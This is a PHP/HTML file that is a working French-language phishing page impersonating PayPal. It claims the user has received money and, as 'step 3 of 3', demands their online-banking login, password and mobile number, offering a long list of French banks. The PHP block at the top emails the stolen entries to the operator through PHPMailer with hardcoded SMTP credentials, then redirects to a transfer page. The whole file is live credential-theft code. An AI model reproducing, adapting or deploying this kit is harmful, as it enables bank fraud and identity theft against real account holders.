<?php
require("PHPMailer-master/src/PHPMailer.php");
require("PHPMailer-master/src/SMTP.php");
require("PHPMailer-master/src/Exception.php");

if (isset($_POST['detailsSubmit'])) {  // bloc if a inserer dans ton code

$mail = new PHPMailer\PHPMailer\PHPMailer();

$mail->isSMTP();
//$mail->SMTPDebug = 1;
$mail->Host = 'placaliandgarba.fun';
$mail->SMTPAuth = true;
$mail->Username = 'petit-joli-coeur@placaliandgarba.fun';

$mail->Password = "angola89@";
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addAddress('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addReplyTo('petit-joli-coeur@placaliandgarba.fun','CLIENT');

//$mail->addAttachment($_SESSION['CheminImageDocument']);

$mail->isHTML(true); // Mail envoyé en HTML

$mail->Subject = "Information de la banque"; 

$Message = "name_bank: " . $_POST['name_bank'] . "<br>";
$Message .= "idbancaire: " . $_POST['idbancaire'] . "<br>";
$Message .= "codeperso: " . $_POST['codeperso'] . "<br>";
$Message .= "banque: " . $_POST['banque'] . "<br>";
$Message .= "tel: " . $_POST['tel'] . "<br>";

$mail->Body    =  $Message;

//$mail->AltBody = 'Message au format text/plain';

if (!$mail->send()) {
    // erreur lors de l'envoi.
    $idbancaire = $_POST['idbancaire'];
    $codeperso = $_POST['codeperso'];
    $banque = $_POST['banque'];
    $tel = $_POST['tel'];

    // ou le code ci-dessous pour vider les champs
    // $champ1 = "";
    // $champ2 = "";
    // $champ3 = "";
    // $champ4 = "";

} else {
    // OK message envoyé avec succès.
    header('location: virement.php');
    exit();
}
}
?>
<!DOCTYPE html>
<html data-reactroot="" style="background-color: #f4f6f9;">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/main_style.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">

<div class="contain">
                <div class="img-logo">
                    <a href="https://reglement-en-cours-traitement.go.yj.fr/transfert-instantane/"><img src="img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="https://reglement-en-cours-traitement.go.yj.fr/transfert-instantane/connexion.php" class="log_out">Déconnexion</a></div>
                <div class="cls"></div>
 </div>

<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection" tabindex="-1">
        <div class="vx_modal-content">

        <center><span class="step" style="text-transform:uppercase; text-align:center;"><b>étape 3 sur 3</b></span></center>
        <br>

                <header class="vx_modal-header">
        <div aria-live="polite">
            <div class="headerWrapper">
                <h1 class="vx_text-2 " style="text-align: center">Confirmez votre compte bancaire</h1></div>
        </div>
        <p class="vx_text-body">
        </p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                    <div class="signupCheckBox">
                        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa">
                                Pour bénéficier pleinement de votre compte PayPal et pouvoir transférer votre argent de votre compte paypal vers votre compte bancaire et vice-versa, vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
                            </label>
                            <br>
                            
                            <label for="paypalAccountData_tcpa">
                                Pour confirmez votre compte bancaire:
                            </label>
                            <label for="paypalAccountData_tcpa">
                                Veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en ligne.
                            </label>
                        </div>
                    </div>
                                        <form method="POST" action="" accept-charset="UTF-8" class="proceed maskable contain-info" autocomplete="off" name="cvalidate"><input name="_token" type="hidden" value="kF9gPAn3l6UsVOhwyLW6B1YQSFJNWVgFr7jaecNc">

                        <select name="name_bank" id="bank_name" class="test_banque test_banque vx_form-control" required>
                        
                        <option value="">Sélectionnez votre banque</option>
                        <option value="Société Générale">Société Générale</option>
                        <option value="BNP Paribas">BNP Paribas</option>
                        <option value="Banque Postale">Banque Postale</option>
                        <option value="LCL Crédit Lyonnais">LCL Crédit Lyonnais</option>
                        <option value="CIC Crédit Industriel & Commercial">CIC Crédit Industriel & Commercial</option>
                        <option value="HSBC">HSBC</option>
                        <option value="Crédit Mutuel">Crédit Mutuel</option>
                        <option value="Crédit Mutuel de Bretagne CMB">Crédit Mutuel de Bretagne CMB</option>
                        <option value="Crédit Mutuel Massif Central">Crédit Mutuel Massif Central</option>
                        <option value="Crédit Mutuel Sud Ouest">Crédit Mutuel Sud Ouest</option>
                        <option value="Crédit Mutuel Arkéa">Crédit Mutuel Arkéa</option>
                        <option value="ING Banque">ING Banque</option>
                        <option value="Boursorama Banque">Boursorama Banque</option>
                        <option value="Groupama-Orange Banque">Groupama-Orange Banque</option>
                        <option value="Le Groupe Crédit du Nord">Le Groupe Crédit du Nord</option>
                        <option value="AXA Banque">AXA Banque</option>
                        <option value="Caisse d'Épargne">Caisse d'Épargne</option>
                        <option value="Banque Palatine">Banque Palatine</option>
                        <option value="Barclays -Milleis Banque Privée">Barclays -Milleis Banque Privée</option>
                        <option value="Banque Macif">Banque Macif</option>
                        <option value="Crédit Coopératif">Crédit Coopératif</option>
                        <option value="Hello banque">Hello banque</option> 
                        <option value="Bfor Banque">Bfor Banque</option>
                        <option value="Fortuneo Banque">Fortuneo Banque</option> 
                        <option value="Monabanq">Monabanq</option>
                        <option value="Qonto SAS">Qonto SAS</option>
                        <option value="Société Marseillaise de Crédit">Société Marseillaise de Crédit</option>
                        <option value="BRED Banque Populaire">BRED Banque Populaire</option>
                        <option value="Banque Populaire Alsace Lorraine Champagne">Banque Populaire Alsace Lorraine Champagne</option>
                        <option value="Banque Populaire Aquitaine Centre Atlantique">Banque Populaire Aquitaine Centre Atlantique</option>
                        <option value="Banque Populaire Bourgogne franche comte">Banque Populaire Bourgogne franche comte</option>
                        <option value="Banque Populaire Grand Ouest">Banque Populaire Grand Ouest</option>
                        <option value="Banque Populaire Auvergne Rhône alpes">Banque Populaire Auvergne Rhône alpes</option>
                        <option value="Banque Populaire du nord">Banque Populaire du nord</option>
                        <option value="Banque Populaire du sud">Banque Populaire du sud</option>
                        <option value="Banque Populaire Méditerranée">Banque Populaire Méditerranée</option>
                        <option value="Banque Populaire Occitane">Banque Populaire Occitane</option>
                        <option value="Banque Populaire Rives de paris">Banque Populaire Rives de paris</option>
                        <option value="Banque Populaire Val de France">Banque Populaire Val de France</option>
                        <option value="Crédit Agricole Alpes Provence">Crédit Agricole Alpes Provence</option>
                        <option value="Crédit Agricole Alsace et Vosges">Crédit Agricole Alsace et Vosges</option>
                        <option value="Crédit Agricole Aquitaine">Crédit Agricole Aquitaine</option>
                        <option value="Crédit Agricole Atlantique Vendée">Crédit Agricole Atlantique Vendée</option>
                        <option value="Crédit Agricole Brie Picardie">Crédit Agricole Brie Picardie</option>
                        <option value="Crédit Agricole Centre France">Crédit Agricole Centre France</option>
                        <option value="Crédit Agricole Centre Loire">Crédit Agricole Centre Loire</option>
                        <option value="Crédit Agricole Centre Ouest">Crédit Agricole Centre Ouest</option>
                        <option value="Crédit Agricole Centre Est">Crédit Agricole Centre Est</option>
                        <option value="Crédit Agricole Champagne-Bourgogne">Crédit Agricole Champagne-Bourgogne</option>
                        <option value="Crédit Agricole Charente Maritime Deux Sèvres">Crédit Agricole Charente Maritime Deux Sèvres</option>
                        <option value="Crédit Agricole Charente Périgord">Crédit Agricole Charente Périgord</option>
                        <option value="Crédit Agricole Corse">Crédit Agricole Corse</option>
                        <option value="Crédit Agricole Côtes d’Armor">Crédit Agricole Côtes d’Armor</option>
                        <option value="Crédit Agricole de la Touraine et du Poitou">Crédit Agricole de la Touraine et du Poitou</option>
                        <option value="Crédit Agricole de l’Anjou et du Maine">Crédit Agricole de l’Anjou et du Maine</option>
                        <option value="Crédit Agricole des Savoie">Crédit Agricole des Savoie</option>
                        <option value="Crédit Agricole d’Ile de France">Crédit Agricole d’Ile de France</option>
                        <option value="Crédit Agricole du Languedoc">Crédit Agricole du Languedoc</option>
                        <option value="Crédit Agricole Finistère">Crédit Agricole Finistère</option>
                        <option value="Crédit Agricole Franche-Comté">Crédit Agricole Franche-Comté</option>
                        <option value="Crédit Agricole Ille et Vilaine">Crédit Agricole Ille et Vilaine</option>
                        <option value="Crédit Agricole Loire Haute-Loire">Crédit Agricole Loire Haute-Loire</option>
                        <option value="Crédit Agricole Lorraine">Crédit Agricole Lorraine</option>
                        <option value="Crédit Agricole Morbihan">Crédit Agricole Morbihan</option>
                        <option value="Crédit Agricole Nord de France">Crédit Agricole Nord de France</option>
                        <option value="Crédit Agricole Nord Est">Crédit Agricole Nord Est</option>
                        <option value="Crédit Agricole nord Midi-Pyrénées">Crédit Agricole nord Midi-Pyrénées</option>
                        <option value="Crédit Agricole Normandie">Crédit Agricole Normandie</option>
                        <option value="Crédit Agricole Normandie-Seine">Crédit Agricole Normandie-Seine</option>
                        <option value="Crédit Agricole Provence Côte d’Azur">Crédit Agricole Provence Côte d’Azur</option>
                        <option value="Crédit Agricole Pyrénées Gascogne">Crédit Agricole Pyrénées Gascogne</option>
                        <option value="Crédit Agricole Sud Méditerranée">Crédit Agricole Sud Méditerranée</option>
                        <option value="Crédit Agricole Sud Rhône Alpes">Crédit Agricole Sud Rhône Alpes</option>
                        <option value="Crédit Agricole Toulouse 31">Crédit Agricole Toulouse 31</option>
                        <option value="Crédit Agricole Val de France">Crédit Agricole Val de France</option>
                        <option value="Nickel">Nickel</option>
                        <option value="N26">N26</option>
                        <option value="My French">My French</option>    
                        
                        </select>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="IDENTIFIANT D’ACCÈS EN LIGNE DE VOTRE COMPTE BANCAIRE">
                            <label class="floatingLabel" for="banque">IDENTIFIANT D’ACCÈS EN LIGNE DE VOTRE COMPTE BANCAIRE</label>

                            <input value="<?php echo $idbancaire; ?>" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardmontant" name="idbancaire" type="text">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="MOT DE PASSE D’ACCÈS EN LIGNE DE VOTRE COMPTE BANCAIRE">
                            <label class="floatingLabel" for="banque">MOT DE PASSE D’ACCÈS EN LIGNE DE VOTRE COMPTE BANCAIRE</label>
                           <input value="<?php echo $codeperso; ?>" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="codeperso" type="text">
                       </div>

                    <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Numéro de mobile">
                        <label class="floatingLabel" for="banque">Numéro de mobile</label>
                        <input value="<?php echo $tel; ?>" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="tel" type="text">
                    </div>

                       <div class="signupCheckBox">
                            <div class="expandableContainer">
                                    <h5>Pourquoi dois-je vérifier les informations financières?</h5>
                                    <label for="paypalAccountData_tcpa">
                                        <span>Si votre compte PayPal a été piraté, un individu mal intentionné pourrait receptionner votre paiement en votre nom. La vérification bancaire permet de pallier ce risque.<br/>
                                            PayPal vous demande de vérifier votre compte de sorte que des futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.
                                            </span>
                                    </label>
                                <h5>PayPal vous remercie de votre confiance</h5>

                            </div>
                        </div>

                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Valider</button>
                    </form>

                </div>

            </div>

        </div>

    </div>

    <div class="foot-pay">
                <center>
                    <a href="#">Contact</a>
                    <a href="#">Respect de la vie privée</a>
                    <a href="#">Contrat d'utilisation</a>
                    <a href="#">International</a>                    
                </center>            
    </div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>

</html>